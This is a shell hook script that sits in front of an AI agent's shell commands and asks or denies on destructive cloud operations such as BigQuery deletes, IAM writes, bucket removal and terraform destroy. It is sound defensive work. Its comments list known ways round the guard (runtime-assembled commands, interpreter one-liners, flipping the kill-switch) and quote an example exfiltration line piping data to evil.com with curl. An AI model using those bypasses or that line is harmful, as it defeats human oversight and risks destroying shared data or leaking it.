#!/usr/bin/env sh
[ "${HARBOR_ADMISSION_DISABLE:-0}" = "1" ] && exit 0
# admission-cloud.sh (harbor#194 item 3, harbor#193 warning-layer) - PreToolUse(Bash) ASK-gate for destructive cloud operations (ledger token `cloud`).
# Why: the everyday gcx ADC identity can delete a BigQuery table and nothing in the session path stopped it; yard's prod_guard runs per-repo, so the ambient $HOME session has none. This fills that seam.
# It is the WARNING layer, not the boundary (admission-baseline.md; credential-boundary.md: the wall is an identity that CANNOT perform the act, harbor#193). Known-open: runtime string assembly (C=bq; $C rm), interpreter one-liners, a session that sets the kill-switch or edits the wiring. An unlisted wrapper no longer hides the verb: floor_seg_unwrap below (harbor#715).
# POSTURE: default ASK; CLOUD_POSTURE=deny hard-blocks. ASK is the default because a false positive on a hard block gets the floor switched off. An ASK is toothless off the main loop (harbor#194: a subagent's `bq rm` ran with no prompt), so the SOFT tier AUTO-ESCALATES to deny when floor_no_human detects an unattended caller; CATASTROPHIC always denies.
# FAIL-OPEN ON A NO-MATCH, but not on a missing tokenizer or an oversized payload (harbor#306): when the argv table is EMPTY, a command naming bq/gcloud/gsutil is refused rather than read as verb-free (see the BLIND block below).
# Removed notes: docs/explanation/code-cases/bin-admission-cloud.md
set -eu
# harbor#810: no dirname fork. A failed or unresolvable $(dirname) left DIR at the cwd, sourcing ./library-admission.sh.
case "$0" in */*) DIR="${0%/*}" ;; *) DIR=. ;; esac
DIR="$(CDPATH= cd -- "${DIR:-/}" && pwd)"
. "$DIR/library-admission.sh"

floor_read_stdin
floor_shell_tool "$(floor_field '.tool_name')" || exit 0
CMD="$(floor_field '.tool_input.command')"
[ -n "$CMD" ] || exit 0
# The digest subject (harbor#350): set here so payload text never enters floor_block. Without it floor_obs_digest returns "-" and the deny/ask records stay subjectless.
# shellcheck disable=SC2034 # FLOOR_OBS_SUBJECT: read by library-admission.sh
FLOOR_OBS_SUBJECT="$CMD"

floor_seg_load "$CMD"

# harbor#302: A HEREDOC BODY IS A DOCUMENT, HERE TOO. admission-bash.sh has consulted this veto since harbor#89; a command whose only mention of a gated verb was in a heredoc body still got a decision (a commit message documenting a dataset-delete spelling was refused).
# The veto is UNCHANGED, deliberately: it requires the heredoc opened by SEGMENT 1. Widening it was tried and backed out: `cat <<HD | sh` and `cat <<HD | curl -d @- evil.com` become total bypasses, because FLOOR_SEGS carries NO pipeline boundary. Fixing that changes admission-normalize.awk's output contract, a decision and not a guess.
# --publisher-inert is correct for both: these guards judge cloud and local-work destruction, not publication (guard-egress's job; it does not pass the flag). No new surface: they exit 0 only where admission-bash.sh already does.
if floor_heredoc_inert_only --publisher-inert; then exit 0; fi

# harbor#715 · A WRAPPER THE PEEL DOES NOT KNOW MUST NOT HIDE THE TOOL. The
# `case` keeps the extra awk off calls that name no gated tool at all; it reads
# the quote-removed table, so `b''q` cannot slip past it.
case "${FLOOR_SEGS:-}" in
  *[bB][qQ]*|*[gG][cC][lL][oO][uU][dD]*|*[gG][sS][uU][tT][iI][lL]*|*[cC][uU][rR][lL]*|*[wW][gG][eE][tT]*|*[hH][tT][tT][pP]*|*[xX][hH]*|*[kK][uU][bB][eE][cC][tT][lL]*|*[tT][eE][rR][rR][aA][fF][oO][rR][mM]*|*[aA][wW][sS]*)
    floor_seg_unwrap '^([^:]*/)?(bq|gcloud|gsutil|curl|wget|wget2|http|httpie|xh|kubectl|terraform|aws)$' ;;
esac

# Three tiers. CATASTROPHIC = irreversible on shared client infra (dataset/bucket/project deletion, IAM writes, REST DELETE to Google). SOFT = other destructive verbs. Both stop autonomous execution; the tier changes the wording and, under CLOUD_POSTURE=deny, whether ASK degrades to DENY.
# IDENTITY (2026-09-15) is not a destruction tier: an auth change re-points the ACTIVE credential for every LATER command, so the damage lands one command after the one a guard could question. It decides like SOFT with its own message. GTMSTD (2026-10-03) is a policy tier: deny-always, see its rule.
REASON=""; TIER=""; SHAPE="argv"; BLIND=0
ID_HINT=""   # set only by the IDENTITY rules; declared here because set -u is on

# Case-insensitive SQL keyword fragments, spelled as char classes: floor_seg_has uses `grep -Eq` without -i. The quoted query is ONE arg token, so these match SQL as an OPERAND of the bq-query segment, not a commit message or a column named `dropped_events`.
_S='[[:space:]]+'
_DROP='[Dd][Rr][Oo][Pp]'; _TRUNC='[Tt][Rr][Uu][Nn][Cc][Aa][Tt][Ee]'
_DEL='[Dd][Ee][Ll][Ee][Tt][Ee]'; _CRE='[Cc][Rr][Ee][Aa][Tt][Ee]'
_ORREP='[Oo][Rr]'"$_S"'[Rr][Ee][Pp][Ll][Aa][Cc][Ee]'
_TBL='[Tt][Aa][Bb][Ll][Ee]'; _VIEW='[Vv][Ii][Ee][Ww]'
_MATV='[Mm][Aa][Tt][Ee][Rr][Ii][Aa][Ll][Ii][Zz][Ee][Dd]'"$_S$_VIEW"
_FUNC='[Ff][Uu][Nn][Cc][Tt][Ii][Oo][Nn]'; _PROC='[Pp][Rr][Oo][Cc][Ee][Dd][Uu][Rr][Ee]'
_FROM='[Ff][Rr][Oo][Mm]'; _MERGE='[Mm][Ee][Rr][Gg][Ee]'
# Data-destroying DDL/DML — DROP of a data-bearing object, TRUNCATE, or a
# CREATE OR REPLACE TABLE that overwrites the old table's rows.
SQL_CATA="${_DROP}${_S}${_TBL}|${_DROP}${_S}[Ss][Cc][Hh][Ee][Mm][Aa]|${_DROP}${_S}${_MATV}|${_DROP}${_S}[Ss][Nn][Aa][Pp][Ss][Hh][Oo][Tt]${_S}${_TBL}|${_TRUNC}${_S}${_TBL}|${_CRE}${_S}${_ORREP}${_S}${_TBL}"
# Row / object-definition changes — narrower or time-travel-recoverable.
SQL_SOFT="${_DEL}${_S}${_FROM}|${_DROP}${_S}(${_VIEW}|${_FUNC}|${_PROC})|${_CRE}${_S}${_ORREP}${_S}(${_VIEW}|${_FUNC})|${_MERGE}.*[Tt][Hh][Ee][Nn]${_S}${_DEL}"

# ARMING AN EXPIRY IS NOT CLEARING ONE (Codex review of PR #209, verified against the bq CLI): the flag is `--time_partitioning_expiration`; absl-flags also takes `--expiration=3600`; and ZERO CLEARS (`bq help update`: "Specifying 0 removes expiration time"), so asking on `--expiration 0` blocks the operator while PREVENTING data loss.
# The clearing value is PER FLAG: `--expiration`, `--default_table_expiration` and `--default_partition_expiration` clear on 0, `--time_partitioning_expiration` on a NEGATIVE number. EXEMPT, NEVER FIRE: the rule fires on the flag and steps aside only when the adjacent value is provably the clearing one, so an expanded value (`--expiration $SECS`) stays destructive.
_BQ_EXP_TOK='^--(expiration|default_table_expiration|default_partition_expiration)(=.*)?$'
_BQ_EXP_NAME='^--(expiration|default_table_expiration|default_partition_expiration)$'
_BQ_PEXP_TOK='^--time_partitioning_expiration(=.*)?$'
_BQ_PEXP_NAME='^--time_partitioning_expiration$'
_bq_arms_expiry() {
  if floor_seg_has '^([^:]*/)?bq$' '^update$' "$_BQ_EXP_TOK"; then
    if floor_seg_flagval '^([^:]*/)?bq$' "$_BQ_EXP_NAME" '^0+$'; then :; else return 0; fi
  fi
  if floor_seg_has '^([^:]*/)?bq$' '^update$' "$_BQ_PEXP_TOK"; then
    if floor_seg_flagval '^([^:]*/)?bq$' "$_BQ_PEXP_NAME" '^-[0-9]+$'; then :; else return 0; fi
  fi
  return 1
}

# HELP IS A READ, computed here because the rule chain below is one if/elif with nowhere to put a statement. Scoped to the IDENTITY arms: `--help` beside a destructive verb is NOT exempted. `if/then`, not `cmd && var=1`: under `set -e` the latter aborts the guard whenever the predicate is false.
_ID_HELP=0
if floor_seg_has '^([^:]*/)?gcloud$' '^--help$|^-h$|^help$'; then _ID_HELP=1; fi

# GTMSTD: a Tag Manager version cut or publish OUTSIDE the standard's version-cut command, which runs the never-worse gate first; a raw `:create_version` skips it, and `:publish` is the operator's, in the GTM UI. Deny-always. The command's exact form lives in the gtm skill (core names no company or sibling repo).
# Argv, never prose: the verb must sit in an HTTP client's or an interpreter's arguments; document heredoc bodies are dropped first with the primitive guard-deliverables uses, for this rule only.
_TM_HOST='[Tt][Aa][Gg][Mm][Aa][Nn][Aa][Gg][Ee][Rr]\.[Gg][Oo][Oo][Gg][Ll][Ee][Aa][Pp][Ii][Ss]\.[Cc][Oo][Mm]'
_TM_VERB=':(create_version|publish)([?#]|$)'
_TM_CLIENT='^([^:]*/)?(curl|wget|wget2|http|httpie|xh)$'
_TM_INTERP='^([^:]*/)?(python[0-9.]*|node|nodejs|bun|deno|ruby|perl)$'
# v1 has no colon verbs (PR #947 review): create is POST .../versions, publish is
# POST .../versions/{id}/publish. A v1 versions GET (a list) stays allowed.
_TM_V1PUB='/tagmanager/v1/.*/versions/[^/?#[:space:]]+/publish([?#]|$)'
_TM_V1VER='/tagmanager/v1/.*/versions([?#]|$)'
_TM_POST='^(POST|-XPOST|-d|--data|--data-raw|--data-binary|--data-urlencode|--json|-F|--form)$|^--data(-raw|-binary|-urlencode)?=|^--json='
# A verb the shell assembles (`:$A`, `:${A}`): what runs cannot be read from the text,
# so with the host or the gtm-write identity in the command it fails closed.
_TM_VARVERB=':[$][{]?[A-Za-z_]'
_tmflat() { printf '%s' "$_tmc" | "$FLOOR_GREP" -Eq -- "$1"; }
_gtm_version_call() {
  case "$CMD" in *:create_version*|*:publish*|*/v1/*|*':$'*) ;; *) return 1 ;; esac  # no fork on the hot path
  _tmc="$CMD"
  case "$CMD" in *'<<'*) _tmc="$(floor_hd_unwrap_doc_bodies --writers "$CMD")" ;; esac
  case "$_tmc" in *:create_version*|*:publish*|*/v1/*|*':$'*) ;; *) return 1 ;; esac
  _tmsegs="${FLOOR_SEGS:-}"; _tmscmd="${FLOOR_SEG_CMD:-}"
  if [ "$_tmc" != "$CMD" ]; then
    floor_seg_load "$_tmc"
    floor_seg_unwrap '^([^:]*/)?(bq|gcloud|gsutil|curl|wget|wget2|http|httpie|xh)$'
  fi
  _tmhit=1
  # A literal URL: the host and the verb in one client argument.
  if floor_seg_has "$_TM_CLIENT" "${_TM_HOST}/.*${_TM_VERB}"; then _tmhit=0
  # A URL built from a variable ("$B/workspaces/${W}:create_version"): the host or
  # the gtm-write identity named elsewhere in the same command.
  elif floor_seg_has "$_TM_CLIENT" "^\\\$[^[:space:]]*${_TM_VERB}" \
    && _tmflat "${_TM_HOST}|(^|[^[:alnum:]_-])gtm-write([^[:alnum:]_-]|$)"; then _tmhit=0
  # v1: publish by path; create by path plus a POST signal (method or body).
  elif floor_seg_has "$_TM_CLIENT" "${_TM_HOST}${_TM_V1PUB}"; then _tmhit=0
  elif floor_seg_has "$_TM_CLIENT" "${_TM_HOST}${_TM_V1VER}" "$_TM_POST"; then _tmhit=0
  # A verb assembled by the shell, with the host or the gtm-write identity in the command.
  elif floor_seg_has "$_TM_CLIENT" "$_TM_VARVERB" \
    && _tmflat "${_TM_HOST}|(^|[^[:alnum:]_-])gtm-write([^[:alnum:]_-]|$)"; then _tmhit=0
  # An interpreter: -c/-e code carrying both, or a heredoc script naming both.
  elif floor_seg_has "$_TM_INTERP" "$_TM_HOST" ":(create_version|publish)"; then _tmhit=0
  elif floor_seg_cmd "$_TM_INTERP" && _tmflat '<<' && _tmflat "$_TM_HOST" \
    && _tmflat ':(create_version|publish)'; then _tmhit=0
  fi
  FLOOR_SEGS="$_tmsegs"; FLOOR_SEG_CMD="$_tmscmd"
  return "$_tmhit"
}

if _gtm_version_call; then
  TIER=GTMSTD; REASON="a Tag Manager version cut or publish (:create_version / :publish) outside the standard's version-cut command — it skips the standard's gate"
# bq: `rm`/`truncate`, `query` running destructive SQL, and the overwrite/expiry verbs that carry NO delete token (`load/query --replace`, `cp -f` via WRITE_TRUNCATE, `--expiration` timers, `mk --transfer_config`).
elif floor_seg_has '^([^:]*/)?bq$' '^query$' "$SQL_CATA"; then
  TIER=CATASTROPHIC; REASON="bq query destructive DDL (DROP/TRUNCATE TABLE, DROP MATERIALIZED VIEW/SNAPSHOT, CREATE OR REPLACE TABLE) — destroys BigQuery data"
elif floor_seg_has '^([^:]*/)?bq$' '^query$' "$SQL_SOFT"; then
  TIER=SOFT; REASON="bq query DELETE FROM / DROP VIEW·FUNCTION / CREATE OR REPLACE VIEW / MERGE…THEN DELETE — mutates rows or object definitions"
elif floor_seg_has '^([^:]*/)?bq$' '^truncate$'; then
  TIER=CATASTROPHIC; REASON="bq truncate — empties a BigQuery table/dataset to a timestamp (server-side)"
elif floor_seg_has '^([^:]*/)?bq$' '^load$' '^--replace$|^--replace=[Tt]rue$'; then
  TIER=CATASTROPHIC; REASON="bq load --replace — WRITE_TRUNCATE overwrites the destination table"
elif floor_seg_has '^([^:]*/)?bq$' '^query$' '^--replace$|^--replace=[Tt]rue$'; then
  TIER=CATASTROPHIC; REASON="bq query --replace — overwrites the destination table (WRITE_TRUNCATE)"
elif floor_seg_has '^([^:]*/)?bq$' '^cp$' '^-f$|^--force$|^--force=[Tt]rue$'; then
  TIER=CATASTROPHIC; REASON="bq cp -f — overwrites the destination table (WRITE_TRUNCATE, no prompt)"
elif floor_seg_has '^([^:]*/)?bq$' '^mk$' '^--transfer_config$|^--transfer_run$'; then
  TIER=SOFT; REASON="bq mk --transfer_config — schedules a server-side query that runs later, unattended"
elif _bq_arms_expiry; then
  TIER=SOFT; REASON="bq update --expiration — arms a timer that silently deletes data later (no delete line is ever logged)"
elif floor_seg_has '^([^:]*/)?bq$' '^rm$'; then
  if floor_seg_has '^([^:]*/)?bq$' '^rm$' '^-d$|^--dataset$|^-r$|^--recursive$'; then
    TIER=CATASTROPHIC; REASON="bq rm of a DATASET or recursive delete on shared BigQuery"
  else
    TIER=SOFT; REASON="bq rm (BigQuery table/model delete)"
  fi
# gcloud: IAM writes, SA-key minting, storage rm/rsync-delete, delete (tiered).
elif floor_seg_has '^([^:]*/)?gcloud$' '^set-iam-policy$|^add-iam-policy-binding$|^remove-iam-policy-binding$'; then
  TIER=CATASTROPHIC; REASON="gcloud IAM-policy write on shared identities (blast radius reaches colleagues)"
elif floor_seg_has '^([^:]*/)?gcloud$' '^keys$' '^create$'; then
  TIER=CATASTROPHIC; REASON="gcloud iam service-accounts keys create — mints a downloadable long-lived credential"
elif floor_seg_has '^([^:]*/)?gcloud$' '^rsync$' '^-[a-zA-Z]*d$|^--delete-unmatched-destination-objects$'; then
  TIER=CATASTROPHIC; REASON="gcloud storage rsync --delete — mirror-delete of destination objects"
elif floor_seg_has '^([^:]*/)?gcloud$' '^rm$'; then
  TIER=CATASTROPHIC; REASON="gcloud storage rm (object/bucket delete)"
elif floor_seg_has '^([^:]*/)?gcloud$' '^delete$' '^projects$|^buckets$'; then
  TIER=CATASTROPHIC; REASON="gcloud projects/buckets delete — irreversible on shared infra"
elif floor_seg_has '^([^:]*/)?gcloud$' '^delete$'; then
  TIER=SOFT; REASON="gcloud … delete"
elif floor_seg_has '^([^:]*/)?gcloud$' '^services$' '^disable$'; then
  TIER=SOFT; REASON="gcloud services disable — turning off an API silently breaks production data flows (destruction without a delete token)"
# gcloud IDENTITY: the active credential, not the resources it reaches.
# ORDER IS LOAD-BEARING: these sit AFTER every destructive gcloud rule so a command carrying both (`gcloud auth revoke && bq rm -r -d ...`) keeps the destruction verdict, and the ADC arm sits BEFORE the plain-login arm because `auth application-default login` carries both `auth` and `login`.
# The remedy (ID_HINT) is PER COMMAND, not per tier: a shared "pin it: gcloud auth login" tail contradicted the ADC rule, whose point is that ADC is a different store.
elif [ "$_ID_HELP" = 0 ] && floor_seg_has '^([^:]*/)?gcloud$' '^auth$' '^application-default$' '^login$'; then
  TIER=IDENTITY; REASON="gcloud auth application-default login — rewrites APPLICATION DEFAULT CREDENTIALS, the store libraries, dbt and the BigQuery SDKs read"
  ID_HINT="ADC is a SEPARATE store from the CLI credential: this does not change who bq/gcloud run as, and a broken CLI login is not fixed by it. Note which account you pick in the browser — ADC and the CLI can end up as different identities, and the mismatch surfaces later as a permissions error."
elif [ "$_ID_HELP" = 0 ] && floor_seg_has '^([^:]*/)?gcloud$' '^auth$' '^login$'; then
  TIER=IDENTITY; REASON="gcloud auth login — re-points the ACTIVE CLI account for every later bq/gcloud call in this session, and does NOT write ADC"
  ID_HINT="The browser does not necessarily default to the account above, and the wrong pick surfaces on the NEXT command rather than this one. Pin it rather than choosing in the browser."
elif [ "$_ID_HELP" = 0 ] && floor_seg_has '^([^:]*/)?gcloud$' '^auth$' '^revoke$'; then
  TIER=IDENTITY; REASON="gcloud auth revoke — removes a stored credential"
  ID_HINT="Anything still running as that account starts failing, and the failure reads as a permissions problem rather than as this command. Check what uses it before revoking."
elif [ "$_ID_HELP" = 0 ] && floor_seg_has '^([^:]*/)?gcloud$' '^config$' '^set$|^unset$' '^account$'; then
  TIER=IDENTITY; REASON="gcloud config set/unset account — re-points the active CLI account"
  ID_HINT="No browser, no output, no credential fetched: the switch is silent and the next command simply runs as somebody else."
elif [ "$_ID_HELP" = 0 ] && floor_seg_has '^([^:]*/)?gcloud$' '^configurations$' '^activate$'; then
  TIER=IDENTITY; REASON="gcloud config configurations activate — switches the whole active configuration"
  ID_HINT="Account and project move together, so a command that looks unchanged can hit a different project as a different identity."
# gsutil: rb, rm, rsync -d (mirror delete), iam/acl writes.
elif floor_seg_has '^([^:]*/)?gsutil$' '^rb$'; then
  TIER=CATASTROPHIC; REASON="gsutil rb (bucket delete)"
elif floor_seg_has '^([^:]*/)?gsutil$' '^rsync$' '^-[a-zA-Z]*d$'; then
  TIER=CATASTROPHIC; REASON="gsutil rsync -d — mirror-delete of destination objects"
elif floor_seg_has '^([^:]*/)?gsutil$' '^iam$|^acl$|^defacl$' '^set$|^ch$'; then
  TIER=CATASTROPHIC; REASON="gsutil iam/acl write — bucket/object permission change"
elif floor_seg_has '^([^:]*/)?gsutil$' '^rm$'; then
  TIER=SOFT; REASON="gsutil rm (object delete)"
# REST: DELETE (case-blind, method token only) / setIamPolicy at a Google API.
# Wider client set; the method is matched as a whole/glued token so a GET to a
# resource whose name contains "delete" does not false-positive.
elif floor_seg_has '^([^:]*/)?(curl|wget|wget2|http|httpie|xh)$' '^[Dd][Ee][Ll][Ee][Tt][Ee]$|[Xx][Dd][Ee][Ll][Ee][Tt][Ee]|method=[Dd][Ee][Ll][Ee][Tt][Ee]' 'googleapis\.com'; then
  TIER=CATASTROPHIC; REASON="HTTP DELETE against a Google API endpoint"
elif floor_seg_has '^([^:]*/)?(curl|wget|wget2|http|httpie|xh)$' ':setIamPolicy' 'googleapis\.com'; then
  TIER=CATASTROPHIC; REASON="setIamPolicy against a Google API endpoint"
# NON-GCP CLOUDS (harbor#1149): the review found kubectl, terraform and aws were not covered at all.
# SOFT-equivalent (ask, deny off the main loop), own tiers only so the ledger id names the class.
elif floor_seg_has '^([^:]*/)?kubectl$' '^delete$'; then
  TIER=NGKUBE; REASON="kubectl delete — removes cluster resources"
elif floor_seg_has '^([^:]*/)?terraform$' '^destroy$'; then
  TIER=NGTF; REASON="terraform destroy — tears down every resource in the state"
elif floor_seg_has '^([^:]*/)?terraform$' '^apply$' '^-{1,2}auto-approve(=.*)?$'; then
  TIER=NGTF; REASON="terraform apply -auto-approve — applies a plan (deletions included) with no confirmation"
elif floor_seg_has '^([^:]*/)?aws$' '^terminate-instances$'; then
  TIER=NGAWS; REASON="aws ec2 terminate-instances — irreversibly destroys EC2 instances"
elif floor_seg_has '^([^:]*/)?aws$' '^s3$' '^rb$'; then
  TIER=NGAWS; REASON="aws s3 rb — removes an S3 bucket"
elif floor_seg_has '^([^:]*/)?aws$' '^s3$' '^rm$' '^--recursive$'; then
  TIER=NGAWS; REASON="aws s3 rm --recursive — deletes every object under the prefix"
elif floor_seg_has '^([^:]*/)?aws$' '^delete-[a-z0-9-]+$'; then
  TIER=NGAWS; REASON="aws … delete-* — deletes an AWS resource"
fi

# THE ARGV LAYER WENT BLIND: deny-always must not degrade to allow (harbor#306; same repair as admission-destroy.sh, see its note). Every rule above is floor_seg_has, so an empty table made `bq rm -r -d proj:dataset` a silent ALLOW with 33,000 bytes of trailing comment.
# The question asked is the one answerable with no tokenizer: does the executed text name a gated tool (not a second copy of sixteen rules). The REST family keeps both anchors: curl/wget are everywhere, so the degraded form also requires googleapis.com.
# COARSER THAN THE ARGV TIER, ON PURPOSE: a degraded `bq ls` denies where argv would allow it. Measured over 14,505 real commands, one exceeded FLOOR_MAX_NORM (0.0069%); each gets a named reason and remedy, against a silent allow on dataset deletion.
if [ -z "$TIER" ] && floor_seg_degraded; then
  # Only in this branch: floor_bash_targets forks awk, and the allow path must not pay for it. Over the cap it returns the raw command, which is the input needed.
  _CT="$(floor_bash_targets "$CMD")"
  _cfhit() { printf '%s' "$_CT" | "$FLOOR_GREP" -iEq -- "$1"; }
  _cblind=""
  if _cfhit '(^|[^[:alnum:]_./-])([a-zA-Z0-9_./-]*/)?bq([[:space:]]|$)';     then _cblind="bq"
  elif _cfhit '(^|[^[:alnum:]_./-])([a-zA-Z0-9_./-]*/)?gcloud([[:space:]]|$)'; then _cblind="gcloud"
  elif _cfhit '(^|[^[:alnum:]_./-])([a-zA-Z0-9_./-]*/)?gsutil([[:space:]]|$)'; then _cblind="gsutil"
  elif _cfhit '(^|[^[:alnum:]_./-])([a-zA-Z0-9_./-]*/)?(curl|wget|wget2|http|httpie|xh)([[:space:]]|$)' \
    && _cfhit 'googleapis\.com';                                            then _cblind="an HTTP client against googleapis.com"
  fi
  if [ -n "$_cblind" ]; then
    TIER=CATASTROPHIC; BLIND=1; SHAPE="flat"
    REASON="the argv tokenizer could not parse this call (over the ${FLOOR_MAX_NORM}-byte normalizer cap, nested past what the normalizer expands, or awk/admission-normalize.awk unavailable) and the command names $_cblind, whose dataset/bucket/project deletes and IAM writes are deny-always — so the guard cannot tell a read from an irreversible delete on shared client infrastructure. Re-run it under the cap, or the operator runs it themselves as a \`!\` command, which is not a tool call"
  fi
fi

[ -n "$TIER" ] || exit 0   # no destructive cloud verb — allow

# Decision. CATASTROPHIC (dataset/bucket/project delete, IAM writes, raw REST DELETE) DENIES ALWAYS regardless of posture: an ASK auto-approves in an unattended session, the failure this guard exists for. The operator who means one runs it in a session launched with the kill-switch. SOFT asks; CLOUD_POSTURE=deny escalates it for fully unattended sessions.
# NO-HUMAN AUTO-ESCALATION (harbor#194): floor_no_human (transcript under /subagents/, agent_type, autonomous permission_mode) escalates the ask to deny without touching the interactive path (fail-safe toward "human present").
NOHUMAN=0; floor_no_human && NOHUMAN=1
if [ "$TIER" = CATASTROPHIC ] || [ "$TIER" = GTMSTD ]; then DECISION="deny"
elif [ "$NOHUMAN" = 1 ]; then DECISION="deny"
elif [ "${CLOUD_POSTURE:-ask}" = "deny" ]; then DECISION="deny"
else DECISION="ask"; fi

_NHNOTE=""
[ "$TIER" != CATASTROPHIC ] && [ "$TIER" != GTMSTD ] && [ "$NOHUMAN" = 1 ] && _NHNOTE=" [no-human context — an ask would auto-approve here, so escalated to deny; a human runs this from an interactive session]"
# PER SHAPE: the argv tail ("Reads are never gated") is FALSE for the degraded block, where the tokenizer cannot see the verb.
if [ "$BLIND" = 1 ]; then
  MSG="$REASON."
elif [ "$TIER" = GTMSTD ]; then
  MSG="$REASON. Cut versions only with the GTM standard's own version-cut command (the gtm skill gives its exact form) — it runs the standard's never-worse gate and refuses on a new defect. Publishing is the operator's, in the GTM UI; never offer it."
elif [ "$TIER" = IDENTITY ]; then
  # THE PROMPT MUST NAME THE ACCOUNT BEING LEFT, or it is just another confirm. Read live (a stale name reads as authoritative) from `gcloud config get-value account`: the account lives in gcloud's config dir, which permissions.deny puts off-limits, and the call is local, offline (~0.6s) and runs only after a rule has fired.
  _ACT=""
  if command -v gcloud >/dev/null 2>&1; then
    _ACT="$(gcloud config get-value account 2>/dev/null | head -n1 | tr -d '\r')"
  fi
  # Anything that is not a single printable token (an error, a warning, "(unset)") is no answer and degrades to the generic form. The printable-ASCII test is tr under C: a [!-~] range in `case` follows the locale, and en_NZ rejected every account (harbor#1149).
  case "$_ACT" in ''|'(unset)') _ACT="" ;; esac
  [ -z "$(printf '%s' "$_ACT" | LC_ALL=C tr -d '!-~')" ] || _ACT=""
  if [ -n "$_ACT" ]; then
    _ACTNOTE="ACTIVE CLI ACCOUNT RIGHT NOW: $_ACT."
    # The bare pinned form is not enough where identity dirs exist: a bare login refreshes the AMBIENT config while the wrapper keeps reading the role dir, so nothing appears to change. Stated conditionally, since the dirs are a per-box convention.
    _PIN=" Pinned form: gcloud auth login $_ACT. If this box keeps per-identity config dirs, prefix CLOUDSDK_CONFIG=<dir> — a bare login refreshes the AMBIENT config and leaves the role dir expired, so nothing appears to change."
  else
    _ACTNOTE="The active CLI account could not be read here, so establish which identity you are on before answering."
    _PIN=" Pinned form: gcloud auth login <account>."
  fi
  # ALLOW-LIST: `gcloud auth login <acct>` is the remedy for exactly one rule; a new identity rule must not silently inherit advice nobody checked.
  case "$REASON" in 'gcloud auth login —'*) : ;; *) _PIN="" ;; esac
  MSG="$REASON. $_ACTNOTE Confirm a HUMAN intends this. $ID_HINT$_PIN$_NHNOTE"
else
  MSG="$REASON. This is the WARNING layer, not the boundary (harbor#193): confirm a HUMAN intends this on the named resource. Reads (ls/query/show/describe/get-*) are never gated.$_NHNOTE"
fi

# PreToolUse JSON contract: exit 0, decision on stdout. "ask" prompts the user;
# "deny" blocks and feeds the reason back to the model.
printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"%s","permissionDecisionReason":%s}}\n' \
  "$DECISION" "$(printf '%s [%s]' "$MSG" "$TIER" | jq -Rs .)"

# Census, on the deny path only and never fatal (mirrors guard-bash). The TIER goes in the RULE token, not the shape (the shape slot is enum-gated, so it was coerced to `meta`), mapped through a `case` over call-site literals so design note 4 holds with no fork.
# THE BLIND ARM IS ITS OWN TOKEN: it carries the tier's posture but not its evidence, so filing it under cloud-catastrophic would read as a matched rule.
case "$TIER" in
  CATASTROPHIC) [ "$BLIND" = 1 ] && _crule=argv-blind-cloud || _crule=cloud-catastrophic ;;
  SOFT)         _crule=cloud-soft ;;
  IDENTITY)     _crule=cloud-identity ;;
  GTMSTD)       _crule=cloud-gtm-version ;;
  NGKUBE)       _crule=cloud-kubectl-delete ;;
  NGTF)         _crule=cloud-terraform-destroy ;;
  NGAWS)        _crule=cloud-aws-destroy ;;
  *)            _crule=cloud-unclassified ;;
esac
{ floor_log_decision cloud "$DECISION" "$_crule.$SHAPE" 2>/dev/null || :; } 2>/dev/null || :
exit 0
